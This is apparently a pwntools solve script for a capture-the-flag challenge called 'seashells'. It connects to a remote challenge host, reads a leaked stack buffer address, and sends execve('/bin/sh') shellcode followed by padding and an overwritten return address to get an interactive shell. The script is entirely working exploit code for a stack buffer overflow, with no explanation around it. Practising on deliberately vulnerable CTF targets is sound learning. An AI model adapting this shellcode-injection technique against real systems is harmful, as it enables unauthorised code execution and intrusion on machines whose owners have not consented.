from pwn import *

elf = ELF('./seashells')
p = remote('challenge.ctf.games', 32134)
#p = process('./seashells')

# length 27
shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

buf_addr = int(p.recvline().strip(), 16)
log.info('Buf address: {}'.format(hex(buf_addr)))
payload =  shellcode + 'A' * 109 + p64(buf_addr)

p.recvuntil('How many sea shells did Sally sell by the sea shore?: ')
p.sendline(payload)

p.interactive()
p.close()